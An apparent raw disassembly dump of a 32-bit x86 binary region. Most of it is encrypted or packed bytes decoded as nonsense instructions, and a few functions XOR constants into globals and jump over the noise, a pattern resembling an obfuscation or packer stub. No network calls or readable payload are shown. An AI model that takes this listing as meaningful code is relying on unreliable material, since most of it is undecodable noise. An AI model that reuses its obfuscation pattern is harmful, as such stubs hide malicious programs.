  4094af:	shr    DWORD PTR [ebx+0x42],0x1f
  4094b3:	push   es
  4094b4:	hlt    
  4094b5:	cld    
  4094b6:	(bad)  
  4094b7:	ins    DWORD PTR es:[edi],dx
  4094b8:	iret   
  4094b9:	fwait
  4094ba:	xor    BYTE PTR [edx],al
  4094bc:	jg     0x40944a
  4094be:	scas   al,BYTE PTR es:[edi]
  4094bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094c0:	in     al,0xd3
  4094c2:	dec    esi
  4094c3:	aam    0x54
  4094c5:	fimul  WORD PTR [ebx-0x21a44d4b]
  4094cb:	mov    bl,0x88
  4094cd:	shl    al,1
  4094cf:	mov    al,0xa
  4094d1:	pop    esp
  4094d2:	push   edx
  4094d3:	iret   
  4094d4:	cmc    
  4094d5:	out    dx,eax
  4094d6:	mov    bh,BYTE PTR [eax+0x516600c4]
  4094dc:	adc    esi,DWORD PTR [esi-0xd]
  4094df:	call   FWORD PTR [esi+0x7c]
  4094e2:	(bad)  
  4094e3:	adc    DWORD PTR [bx+si+0x5e91],edi
  4094e8:	or     ebx,edx
  4094ea:	mov    ebp,0x6ab33079
  4094ef:	out    0xf2,al
  4094f1:	mov    edx,0x5f2da986
  4094f6:	mov    eax,0x2385eb33
  4094fb:	pushf  
  4094fc:	push   es
  4094fd:	fcmovnu st,st(0)
  4094ff:	leave  
  409500:	ins    BYTE PTR es:[edi],dx
  409501:	jp     0x4094a7
  409503:	push   ebp
  409504:	pop    edx
  409505:	inc    ecx
  409506:	inc    edi
  409507:	shl    BYTE PTR cs:[esi+0x6f],0x1c
  40950c:	push   ds
  40950d:	adc    al,0x7e
  40950f:	sub    BYTE PTR [esi-0x2b1e80ba],ch
  409515:	and    eax,0xfa3da64e
  40951a:	sub    ebp,0x1635af28
  409520:	shl    DWORD PTR [esi+0x526f2f5a],cl
  409526:	add    esp,DWORD PTR [ebp+0x10]
  409529:	popf   
  40952a:	jo     0x409513
  40952c:	push   ebp
  40952d:	lods   al,BYTE PTR ds:[esi]
  40952e:	retf   
  40952f:	fbstp  TBYTE PTR [ecx]
  409531:	add    al,0xaa
  409533:	loopne 0x4095a0
  409535:	addr16 mov ah,0x65
  409538:	loop   0x409560
  40953a:	add    bl,cl
  40953c:	push   ds
  40953d:	sti    
  40953e:	dec    esi
  40953f:	jnp    0x4094e8
  409541:	mov    ecx,0xeb6560df
  409546:	cmp    al,0x30
  409548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409549:	pusha  
  40954a:	rcl    DWORD PTR [esi],cl
  40954c:	sbb    bl,BYTE PTR ds:0x810387dd
  409552:	into   
  409553:	inc    eax
  409554:	aaa    
  409555:	cdq    
  409556:	loopne 0x40955b
  409558:	arpl   WORD PTR gs:[ecx-0x4a],sp
  40955c:	xor    BYTE PTR [eax-0x453e672c],dh
  409562:	sbb    BYTE PTR [edi],0x66
  409565:	rol    DWORD PTR ds:0x41fcc68a,1
  40956b:	jge    0x4094fb
  40956d:	or     bh,BYTE PTR [edx]
  40956f:	in     eax,0xef
  409571:	call   0xbde1440d
  409576:	sub    al,0x3b
  409578:	and    al,0x8
  40957a:	stc    
  40957b:	out    dx,al
  40957c:	cmp    dl,BYTE PTR [edx+0x57a4cfed]
  409582:	fdivrp st(0),st
  409584:	cmc    
  409585:	sub    dl,BYTE PTR [ecx-0x426bbeff]
  40958b:	ds (bad) 
  40958e:	pop    ss
  40958f:	enter  0x6532,0x88
  409593:	jecxz  0x409520
  409595:	cmp    al,0x33
  409597:	rol    DWORD PTR [edi-0x3629458c],1
  40959d:	and    DWORD PTR ds:0x440917d,edx
  4095a3:	loope  0x4095be
  4095a5:	ja     0x409560
  4095a7:	lods   al,BYTE PTR ds:[esi]
  4095a8:	scas   al,BYTE PTR es:[edi]
  4095a9:	clc    
  4095aa:	xor    bl,bh
  4095ac:	add    bl,BYTE PTR [ebp+0x5b]
  4095af:	sub    eax,0x68
  4095b2:	or     DWORD PTR [esi+ebx*1],0xffffffcf
  4095b6:	shl    BYTE PTR [ebp+0x6b],1
  4095b9:	stos   BYTE PTR es:[edi],al
  4095ba:	push   cs
  4095bb:	fisub  DWORD PTR [ecx+ebx*8]
  4095be:	(bad)  
  4095bf:	mov    ebp,0xcc5de350
  4095c4:	je     0x4095a2
  4095c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095c7:	pop    ss
  4095c8:	sahf   
  4095c9:	rcl    DWORD PTR [edx],1
  4095cb:	and    al,0xeb
  4095cd:	cmc    
  4095ce:	cmp    esp,DWORD PTR [ecx]
  4095d0:	(bad)  
  4095d1:	fild   WORD PTR [eax-0x1cf9ea26]
  4095d7:	popf   
  4095d8:	sbb    eax,0xef4531d3
  4095dd:	(bad)  
  4095de:	sbb    al,BYTE PTR [edx-0x66]
  4095e1:	pop    eax
  4095e2:	jmp    0x17d9:0xafa0529d
  4095e9:	xor    eax,ebp
  4095eb:	and    ch,dl
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ed5:0xc724d04e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	cmp    ch,BYTE PTR [edi+0x64]
  40960f:	or     eax,0x5432c96
  409614:	mov    esp,0xd8de8910
  409619:	lds    eax,FWORD PTR [ebp+0x783c2a30]
  40961f:	mov    esi,0x9e2e02db
  409624:	(bad)  
  409625:	xor    al,0x21
  409627:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409629:	aam    0xba
  40962b:	lods   eax,DWORD PTR ds:[esi]
  40962c:	cld    
  40962d:	xor    ebp,eax
  40962f:	pop    ecx
  409630:	cmp    DWORD PTR [esi-0x688fa11a],ebp
  409636:	js     0x409631
  409638:	and    dh,dh
  40963a:	(bad)  
  40963b:	fcmovnu st,st(5)
  40963d:	inc    ebp
  40963e:	or     eax,0xdb1e9a3d
  409643:	cmp    al,0xd1
  409645:	dec    ebx
  409646:	sahf   
  409647:	cmp    bl,ah
  409649:	cmp    bh,BYTE PTR [edi-0x430d2139]
  40964f:	aam    0xf1
  409651:	inc    ebp
  409652:	lods   al,BYTE PTR ds:[esi]
  409653:	jle    0x4096ce
  409655:	fist   WORD PTR [ebp+0x3db4f55d]
  40965b:	jl     0x4096a1
  40965d:	pop    edi
  40965e:	inc    ecx
  40965f:	adc    cl,BYTE PTR [ecx-0x1d884f1c]
  409665:	retf   
  409666:	mov    esp,0x9067b6cc
  40966b:	jnp    0x4096b8
  40966d:	arpl   WORD PTR [ecx-0x33],di
  409670:	les    eax,FWORD PTR [ebp-0x5a]
  409673:	xor    edi,DWORD PTR [eax+eax*1+0x2f]
  409677:	loop   0x409696
  409679:	pop    edi
  40967a:	mov    ah,al
  40967c:	xlat   BYTE PTR ds:[ebx]
  40967d:	lods   eax,DWORD PTR ds:[esi]
  40967e:	in     eax,dx
  40967f:	sbb    ecx,DWORD PTR [esi-0x19]
  409682:	in     eax,dx
  409683:	adc    al,0x1b
  409685:	pop    eax
  409686:	dec    esp
  409687:	dec    esi
  409688:	or     dh,BYTE PTR [edx+0x2e]
  40968b:	(bad)  
  40968d:	xchg   esp,eax
  40968e:	adc    ch,BYTE PTR [ecx]
  409690:	cmp    al,0xd9
  409692:	dec    esp
  409693:	aam    0x1e
  409695:	jo     0x4096bd
  409697:	pop    ecx
  409698:	pop    ebx
  409699:	das    
  40969a:	into   
  40969b:	adc    DWORD PTR [edi],0x186212e6
  4096a1:	fs test eax,0x7507c6c6
  4096a7:	shr    BYTE PTR [esi+0x2f],0xde
  4096ab:	aaa    
  4096ac:	mov    dh,0x5d
  4096ae:	lods   al,BYTE PTR ds:[esi]
  4096af:	mov    ds:0x41d2c92,al
  4096b4:	out    dx,al
  4096b5:	adc    ecx,edx
  4096b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096b8:	jmp    FWORD PTR [ebp+0x16]
  4096bb:	pop    ebp
  4096bc:	popa   
  4096bd:	in     eax,0xd9
  4096bf:	add    al,0xf0
  4096c1:	shl    edi,1
  4096c3:	sbb    BYTE PTR [edx+eax*2+0x70],al
  4096c7:	mov    esi,0x5ed1f43f
  4096cc:	ins    BYTE PTR es:[edi],dx
  4096cd:	dec    ebp
  4096ce:	sub    eax,0x2f57496a
  4096d3:	jae    0x409740
  4096d5:	cmp    BYTE PTR [ecx-0x3a64c2c6],dl
  4096db:	pusha  
  4096dc:	ror    ecx,1
  4096de:	pmaxub mm4,QWORD PTR ds:0x631f91ef
  4096e5:	lock sbb al,0x4e
  4096e8:	lahf   
  4096e9:	daa    
  4096ea:	iret   
  4096eb:	test   al,0x8
  4096ed:	mov    WORD PTR es:[esi-0x49],gs
  4096f1:	mov    dl,0xb6
  4096f3:	loop   0x4096a5
  4096f5:	inc    ebx
  4096f6:	pop    ebp
  4096f7:	into   
  4096f8:	(bad)  [edx-0xc]
  4096fb:	(bad)
  4096fe:	fstp   DWORD PTR [edi+0x23]
  409701:	ss arpl di,dx
  409704:	scas   al,BYTE PTR es:[edi]
  409705:	cmp    edi,ecx
  409707:	mov    ah,0x5
  409709:	push   ss
  40970a:	cmp    al,0xb1
  40970c:	mov    dh,0x19
  40970e:	icebp  
  40970f:	ror    ch,cl
  409711:	add    ebx,DWORD PTR [esi+eax*4-0x28a06402]
  409718:	mov    ebx,0x1b425ad3
  40971d:	(bad)  
  40971e:	pop    edx
  40971f:	mov    ah,0x55
  409721:	mov    ebx,0x96cbe00d
  409726:	pop    edx
  409727:	out    0xe5,al
  409729:	stc    
  40972a:	test   BYTE PTR [ebp+edx*8-0x3e638089],ch
  409731:	rcr    DWORD PTR [ebp+0x6b],0xba
  409735:	repnz dec ebp
  409737:	(bad)  
  409738:	push   edx
  409739:	scas   eax,DWORD PTR es:[edi]
  40973a:	jae    0x4097b5
  40973c:	push   ds
  40973d:	mov    al,0x15
  40973f:	pop    eax
  409740:	imul   edx,eax,0x80f896e7
  409746:	or     al,0xae
  409748:	sbb    al,0xc8
  40974a:	pop    esp
  40974b:	mov    esp,0x777f91c8
  409750:	mov    ?,WORD PTR [ebp+0x22]
  409753:	add    BYTE PTR [edi+edi*1],dh
  409756:	or     DWORD PTR [eax],0x3
  409759:	stos   DWORD PTR es:[edi],eax
  40975a:	fisttp QWORD PTR [edi+esi*4-0x6a]
  40975e:	daa    
  40975f:	and    DWORD PTR [edx],0x6edd132c
  409765:	popf   
  409766:	mov    ah,0x1
  409768:	cdq    
  409769:	mov    dh,0xd7
  40976b:	ds iret 
  40976d:	inc    esi
  40976e:	outs   dx,DWORD PTR ds:[esi]
  40976f:	adc    dh,ch
  409771:	mov    al,ds:0xc15ace77
  409776:	fist   DWORD PTR [eax]
  409778:	ins    DWORD PTR es:[edi],dx
  409779:	mov    ebx,0xcad8d619
  40977e:	push   eax
  40977f:	jmp    0x4097d9
  409781:	outs   dx,BYTE PTR ds:[esi]
  409782:	adc    dh,BYTE PTR [esi]
  409784:	shl    DWORD PTR [esi+edx*1+0x1d],0xef
  409789:	test   eax,0x477d0e5e
  40978e:	rcl    BYTE PTR [edx+0x6dc32a9d],0xf1
  409795:	sub    BYTE PTR [eax+0x7d97f0b8],bl
  40979b:	add    BYTE PTR [edi+0x72],bh
  40979e:	push   eax
  40979f:	int3   
  4097a0:	ins    BYTE PTR es:[edi],dx
  4097a1:	dec    ebx
  4097a2:	(bad)
  4097a6:	jmp    edx
  4097a8:	sti    
  4097a9:	fisub  WORD PTR [ecx-0x2f]
  4097ac:	lahf   
  4097ad:	fdivr  QWORD PTR [esi+0x12f1d3]
  4097b3:	pop    ecx
  4097b4:	push   cs
  4097b5:	dec    ebp
  4097b6:	jne    0x4097f3
  4097b8:	xlat   BYTE PTR ds:[ebx]
  4097b9:	add    DWORD PTR [eax],ecx
  4097bb:	arpl   WORD PTR [ebx],bp
  4097bd:	les    eax,FWORD PTR [ecx+0x722c69f]
  4097c3:	fistp  WORD PTR [eax-0x144bed7f]
  4097c9:	stos   BYTE PTR es:[edi],al
  4097ca:	dec    ebx
  4097cb:	loop   0x409811
  4097cd:	sub    BYTE PTR [eax],cl
  4097cf:	jmp    0x409783
  4097d1:	add    al,0xb6
  4097d3:	inc    esi
  4097d4:	mov    ecx,cs
  4097d6:	or     BYTE PTR gs:[ecx+0x1654f08f],ch
  4097dd:	sbb    edx,DWORD PTR [edx+ebx*4]
  4097e0:	in     al,dx
  4097e1:	xchg   ebp,eax
  4097e2:	stc    
  4097e3:	stos   DWORD PTR es:[edi],eax
  4097e4:	test   al,cl
  4097e6:	out    dx,eax
  4097e7:	fdiv   DWORD PTR [ebx+0x9]
  4097ea:	into   
  4097eb:	loopne 0x4097b5
  4097ed:	call   0x805b3c42
  4097f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097f3:	xchg   edi,eax
  4097f4:	and    eax,0x226ce869
  4097f9:	pop    ebp
  4097fa:	aad    0x3a
  4097fc:	call   0x574ad902
  409801:	dec    ebx
  409802:	or     al,0xa
  409804:	lahf   
  409805:	shl    BYTE PTR [ebp-0xc],cl
  409808:	xchg   DWORD PTR [esi+0x16],edi
  40980b:	(bad)  
  40980c:	and    eax,0x2ced2e0a
  409811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409812:	and    al,0xb5
  409814:	jno    0x409842
  409816:	push   esp
  409817:	push   esp
  409818:	jbe    0x40982e
  40981a:	mov    esi,0x95186370
  40981f:	mov    bh,BYTE PTR [edi-0x7123c4c2]
  409825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409826:	scas   eax,DWORD PTR es:[edi]
  409827:	mov    esi,0x9e71a9fe
  40982c:	lea    esp,[ebx-0x4b]
  40982f:	fld    TBYTE PTR [edx+0x3f8c4c0d]
  409835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	mov    dh,0x35
  4098c2:	repnz add DWORD PTR [ecx+ebx*8+0x7c387e7e],esi
  4098ca:	jle    0x40994a
  4098cc:	sub    BYTE PTR [ebx+0x6],dh
  4098cf:	and    eax,0x1e5b7651
  4098d4:	pop    edi
  4098d5:	push   edi
  4098d6:	or     BYTE PTR [edx-0x54],ch
  4098d9:	and    ch,BYTE PTR [ebx-0x1ed642a7]
  4098df:	jmp    0xe484:0x8c68b825
  4098e6:	mov    dl,BYTE PTR [edx-0x68660255]
  4098ec:	push   DWORD PTR ds:0xb290fc7b
  4098f2:	cdq    
  4098f3:	add    ah,BYTE PTR [eax+0x1f]
  4098f6:	mov    ah,0x32
  4098f8:	dec    esp
  4098f9:	leave  
  4098fa:	pop    es
  4098fb:	into   
  4098fc:	pop    ebx
  4098fd:	xlat   BYTE PTR ds:[ebx]
  4098fe:	or     dl,BYTE PTR [ebx+0x43]
  409901:	ror    DWORD PTR [ecx-0x6339f98b],1
  409907:	mov    bh,0xf0
  409909:	jmp    ebp
  40990b:	or     BYTE PTR [eax+0x40],bh
  40990e:	mov    ah,0x1d
  409910:	cmp    BYTE PTR [edx+0x43],al
  409913:	or     BYTE PTR [ebx],bl
  409915:	sahf   
  409916:	iret   
  409917:	retf   
  409918:	cli    
  409919:	mov    ds:0x6c019e92,eax
  40991e:	jmp    0x2d1b9983
  409923:	push   ebp
  409924:	push   ds
  409925:	das    
  409926:	das    
  409927:	popf   
  409928:	sub    al,0x5a
  40992a:	push   ebx
  40992b:	cmp    eax,0x98cffb58
  409930:	jg     0x4098e5
  409932:	jae    0x4098e3
  409934:	sub    edi,ecx
  409936:	xlat   BYTE PTR ds:[ebx]
  409937:	pop    ebp
  409938:	ins    BYTE PTR es:[edi],dx
  409939:	push   ecx
  40993a:	dec    ecx
  40993b:	cmc    
  40993c:	xchg   ecx,eax
  40993d:	push   0xffffffba
  40993f:	adc    ecx,esp
  409941:	xchg   esi,eax
  409942:	sub    BYTE PTR [edi+esi*2],bh
  409945:	mov    edi,0xb7260b6f
  40994a:	mov    al,ds:0x91b563ca
  40994f:	or     BYTE PTR [eax-0x74],bl
  409952:	sub    eax,0xfa1e57ae
  409957:	ror    cl,1
  409959:	test   al,0x5e
  40995b:	mov    edi,0xb05dacde
  409960:	icebp  
  409961:	inc    ebp
  409962:	out    0x94,al
  409964:	sti    
  409965:	repz ret 0x6225
  409969:	and    DWORD PTR [edi],esi
  40996b:	add    al,0x8c
  40996d:	mov    ch,0xa8
  40996f:	pop    eax
  409970:	jo     0x40999d
  409972:	into   
  409973:	repnz out 0x5c,eax
  409976:	push   es
  409977:	fimul  DWORD PTR [ebx]
  409979:	pop    eax
  40997a:	nop
  40997b:	mov    eax,0xdbcb100f
  409980:	cmp    cl,0x5d
  409983:	ja     0x409997
  409985:	xchg   ebx,eax
  409986:	add    eax,0xda995307
  40998b:	div    BYTE PTR [esi+eiz*1+0x76bd6ff1]
  409992:	xchg   esp,eax
  409993:	fcmovne st,st(0)
  409995:	clc    
  409996:	pop    edi
  409997:	mov    al,0xa3
  409999:	pop    ds
  40999a:	mov    ds:0xe478b1c3,eax
  40999f:	cwde   
  4099a0:	push   ebp
  4099a1:	sbb    al,0xf8
  4099a3:	mov    dh,0x46
  4099a5:	pop    ds
  4099a6:	pushf  
  4099a7:	sub    bh,BYTE PTR [edx+esi*4+0x4969b95e]
  4099ae:	cs jmp 0x40997a
  4099b1:	or     DWORD PTR [eax-0xc9626df],ecx
  4099b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099b8:	dec    edi
  4099b9:	lds    eax,FWORD PTR [esp+ebp*1]
  4099bc:	sub    al,0x15
  4099be:	pop    ebp
  4099bf:	(bad)  
  4099c0:	ficom  WORD PTR [esi-0x6a]
  4099c3:	loop   0x409a43
  4099c5:	out    0x91,al
  4099c7:	jmp    0x9695:0x608e73c5
  4099ce:	and    BYTE PTR [ebp-0x494270d1],dh
  4099d4:	xchg   edi,eax
  4099d5:	daa    
  4099d6:	ret    0xc6a9
  4099d9:	enter  0xc2b4,0x7b
  4099dd:	test   al,0xad
  4099df:	jno    0x409962
  4099e1:	int3   
  4099e2:	dec    edx
  4099e3:	je     0x409a48
  4099e5:	out    0x13,al
  4099e7:	lahf   
  4099e8:	int    0xbc
  4099ea:	mov    eax,DWORD PTR [edi+0x15b69bfd]
  4099f0:	fnsave [ebx]
  4099f2:	and    BYTE PTR [ecx],bl
  4099f4:	adc    al,0x46
  4099f6:	xchg   ebx,eax
  4099f7:	clc    
  4099f8:	push   0xffffff9e
  4099fa:	xchg   ebp,eax
  4099fb:	rcr    BYTE PTR [edx],1
  4099fd:	leave  
  4099fe:	push   edi
  4099ff:	(bad)  
  409a01:	call   0xc0b4:0xa3d54193
  409a08:	cmp    eax,0x750cf2ae
  409a0d:	(bad)  [edx-0x63]
  409a10:	mov    bl,0x8e
  409a12:	push   edx
  409a13:	mov    eax,ds:0x14694cf0
  409a18:	es loope 0x409a4d
  409a1b:	inc    ebx
  409a1c:	arpl   WORD PTR [ebx+esi*4],dx
  409a1f:	or     ebx,DWORD PTR [esp+ebx*1+0x62]
  409a23:	xlat   BYTE PTR ds:[ebx]
  409a24:	push   0xffffffc6
  409a26:	enter  0x5700,0xaf
  409a2a:	leave  
  409a2b:	adc    edx,DWORD PTR [edi+0x1c]
  409a2e:	jne    0x409aad
  409a30:	call   0x1c17:0x3ae7acc6
  409a37:	cmp    edx,DWORD PTR [ecx]
  409a39:	cmp    ah,dh
  409a3b:	mov    ecx,0xd7e8ecbe
  409a40:	push   ebp
  409a41:	add    BYTE PTR [esi+0x18],0x5b
  409a45:	cli    
  409a46:	cmc    
  409a47:	pushf  
  409a48:	test   DWORD PTR ds:0x61f369b8,ebx
  409a4e:	mov    ecx,0xd49508fd
  409a53:	mov    ecx,0xdcfcbffe
  409a58:	jno    0x409ab0
  409a5a:	jns    0x409a4c
  409a5c:	push   edx
  409a5d:	push   eax
  409a5e:	mov    cl,0x28
  409a60:	andnps xmm6,XMMWORD PTR [edx-0x39faf20d]
  409a67:	outs   dx,BYTE PTR ds:[esi]
  409a68:	les    esp,FWORD PTR [esi-0x42db7a9a]
  409a6e:	cmp    esi,edx
  409a70:	data16 int 0xb8
  409a73:	in     al,0xdf
  409a75:	out    0xa,al
  409a77:	and    eax,0xfb843c17
  409a7c:	paddsw mm3,mm3
  409a7f:	outs   dx,BYTE PTR ds:[esi]
  409a80:	test   DWORD PTR [eax-0x7dffae15],eax
  409a86:	mov    bl,0x40
  409a88:	out    0x3e,eax
  409a8a:	xor    esp,DWORD PTR [edi+ebx*8+0x5101e4f2]
  409a91:	cld    
  409a92:	mov    cl,0xd8
  409a94:	test   eax,0xfccad96d
  409a99:	xor    DWORD PTR fs:[edx+0x20],eax
  409a9d:	ja     0x409a7c
  409a9f:	inc    edx
  409aa0:	sbb    ebp,DWORD PTR ss:[esi]
  409aa3:	xor    esp,DWORD PTR [edi+0x4182dd86]
  409aa9:	test   eax,0x741c353a
  409aae:	sbb    BYTE PTR [ebx-0x30],dl
  409ab1:	enter  0xdf58,0x68
  409ab5:	stc    
  409ab6:	add    edx,ebx
  409ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ab9:	shl    DWORD PTR [ebx-0x76571e3f],1
  409abf:	and    DWORD PTR [edi],edi
  409ac1:	pop    es
  409ac2:	daa    
  409ac3:	dec    ebx
  409ac4:	or     al,0x7c
  409ac6:	add    BYTE PTR [ecx+0x22b8c5d5],0x36
  409acd:	mov    edi,0x4cc7bac8
  409ad2:	sbb    eax,DWORD PTR [ebx-0x37edbd08]
  409ad8:	jge    0x409ab8
  409ada:	mov    edx,esp
  409adc:	fwait
  409add:	mov    edi,0x9fb35e1a
  409ae2:	dec    edi
  409ae3:	pop    es
  409ae4:	cdq    
  409ae5:	push   edi
  409ae6:	adc    eax,0x9557bad0
  409aeb:	stos   DWORD PTR es:[edi],eax
  409aec:	pop    ecx
  409aed:	jns    0x409adf
  409aef:	dec    ebx
  409af0:	and    eax,0x5e65b796
  409af5:	sbb    dl,BYTE PTR [ebp+0x1c]
  409af8:	pop    es
  409af9:	sti    
  409afa:	mov    ds:0xdac66870,eax
  409aff:	retf   
  409b00:	loop   0x409aab
  409b02:	icebp  
  409b03:	jl     0x409b31
  409b05:	sbb    al,0x6b
  409b07:	add    dl,dh
  409b09:	mov    ecx,0x8cb31413
  409b0e:	mov    ah,0x7a
  409b10:	das    
  409b11:	retf   
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43369f,0x433653
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x2f6a85d4]
  409b32:	and    eax,0x7e7ee47e
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	das    
  409b3c:	pop    eax
  409b3d:	xchg   ebp,eax
  409b3e:	ins    BYTE PTR es:[edi],dx
  409b3f:	lods   eax,DWORD PTR ds:[esi]
  409b40:	xchg   BYTE PTR [eax-0x36],cl
  409b43:	mov    edi,0xf46dbc52
  409b48:	sbb    ah,BYTE PTR [esi+0x7b36f0ca]
  409b4e:	push   0x87bdc3ef
  409b53:	lock and DWORD PTR [edi+0x224e40bf],0xb5682cba
  409b5e:	push   edx
  409b5f:	scas   eax,DWORD PTR es:[edi]
  409b60:	(bad)  
  409b61:	dec    ebx
  409b62:	mov    WORD PTR [ebp-0x6568f54e],ss
  409b68:	inc    edx
  409b69:	aam    0xf7
  409b6b:	mov    esp,0x824a246c
  409b70:	jne    0x409b51
  409b72:	fild   DWORD PTR [edi+eiz*1-0x6a223a03]
  409b79:	mov    cl,0x30
  409b7b:	lds    ecx,FWORD PTR [edi]
  409b7d:	jmp    0x6563449
  409b82:	call   0x59b71bf
  409b87:	fs mov ah,0x17
  409b8a:	xchg   edi,eax
  409b8b:	jecxz  0x409bda
  409b8d:	mov    ch,0x9f
  409b8f:	push   es
  409b90:	call   0x90466f1f
  409b95:	sub    eax,0x41506b0c
  409b9a:	mov    ds:0xcd6d2afc,al
  409b9f:	mov    dl,0x7e
  409ba1:	ret    0xbada
  409ba4:	(bad)  
  409ba5:	mov    ds,WORD PTR [ebp-0x3d176a25]
  409bab:	(bad)  [ebx]
  409bad:	sub    edi,esp
  409baf:	cmp    al,0x77
  409bb1:	sub    cl,bl
  409bb3:	out    0x2f,eax
  409bb5:	cs push edi
  409bb7:	(bad)  
  409bb8:	hlt    
  409bb9:	jae    0x409bd9
  409bbb:	jnp    0x409ba8
  409bbd:	dec    ebp
  409bbe:	les    ebx,FWORD PTR [eax-0x48493275]
  409bc4:	loope  0x409bb3
  409bc6:	adc    WORD PTR [edi+0x0],sp
  409bca:	mov    ds:0x3206a4a0,al
  409bcf:	and    al,0x7e
  409bd1:	pop    ebx
  409bd2:	outs   dx,BYTE PTR ds:[esi]
  409bd3:	sbb    al,0x9d
  409bd5:	pop    ss
  409bd6:	xchg   edi,eax
  409bd7:	adc    DWORD PTR [edi+ebp*1-0x63],ecx
  409bdb:	icebp  
  409bdc:	je     0x409b84
  409bde:	das    
  409bdf:	push   edx
  409be0:	ret    
  409be1:	jb     0x409b92
  409be3:	and    al,0x59
  409be5:	stos   BYTE PTR es:[edi],al
  409be6:	loope  0x409c67
  409be8:	rep lods eax,DWORD PTR fs:[esi]
  409beb:	jno    0x409bee
  409bed:	and    bh,bh
  409bef:	push   cs
  409bf0:	inc    ecx
  409bf1:	xor    DWORD PTR [ebx+eiz*4-0x2c],0x69
  409bf6:	push   cs
  409bf7:	sub    DWORD PTR [ecx],ebx
  409bf9:	iret   
  409bfa:	bound  ebp,QWORD PTR [ebx]
  409bfc:	outs   dx,BYTE PTR ds:[esi]
  409bfd:	xchg   esi,eax
  409bfe:	mov    eax,ss:0xcf737d5a
  409c04:	or     eax,0xbef4d030
  409c09:	mov    fs,WORD PTR [ebx+0x7896c741]
  409c0f:	les    ecx,FWORD PTR [ecx]
  409c11:	mov    ecx,0x648aba8d
  409c16:	lahf   
  409c17:	in     al,0x3b
  409c19:	pop    ecx
  409c1a:	cld    
  409c1b:	sbb    al,0xc6
  409c1d:	call   FWORD PTR [ebx+0x4]
  409c20:	paddusw mm5,mm5
  409c23:	ficom  WORD PTR gs:[ebx]
  409c26:	mov    al,ds:0x9374823c
  409c2b:	xchg   ebp,eax
  409c2c:	sub    esi,edi
  409c2e:	ins    BYTE PTR es:[edi],dx
  409c2f:	cmp    DWORD PTR [ecx+0x2b],0x16025e8e
  409c36:	int3   
  409c37:	xchg   ebx,eax
  409c38:	mov    ch,0x83
  409c3a:	call   0xd7c9:0xd7529ba7
  409c41:	dec    esi
  409c42:	mov    ebx,0xc612806a
  409c47:	xchg   edx,eax
  409c48:	mov    eax,ds:0x1d7b0bd0
  409c4d:	mov    bl,0xd9
  409c4f:	test   eax,0xbd5f53cd
  409c54:	push   edx
  409c55:	mov    ah,0x24
  409c57:	sar    BYTE PTR [edx-0x413383f2],0x24
  409c5e:	pushf  
  409c5f:	xor    dh,dl
  409c61:	adc    DWORD PTR [eax+ebp*4+0x39],ebx
  409c65:	pushf  
  409c66:	pop    ss
  409c67:	shl    edx,1
  409c69:	dec    edi
  409c6a:	add    bl,BYTE PTR [ebp-0x1f]
  409c6d:	psubq  mm1,QWORD PTR [ecx+0x4b]
  409c71:	cmp    al,BYTE PTR [ecx-0x6f]
  409c74:	xor    ebx,DWORD PTR [esi]
  409c76:	sbb    al,0x57
  409c78:	sbb    ch,cl
  409c7a:	push   esp
  409c7b:	and    dh,dh
  409c7d:	dec    eax
  409c7e:	push   esi
  409c7f:	stos   DWORD PTR es:[edi],eax
  409c80:	and    BYTE PTR [edx],bh
  409c82:	pop    ebp
  409c83:	div    DWORD PTR [esi]
  409c85:	mov    ds:0x6a7c54e6,eax
  409c8a:	icebp  
  409c8b:	fwait
  409c8c:	test   BYTE PTR [ecx-0x3a3426d3],cl
  409c92:	sbb    esp,DWORD PTR [ebp-0x10fc7bbc]
  409c98:	lock mov esp,0x6c0f13a
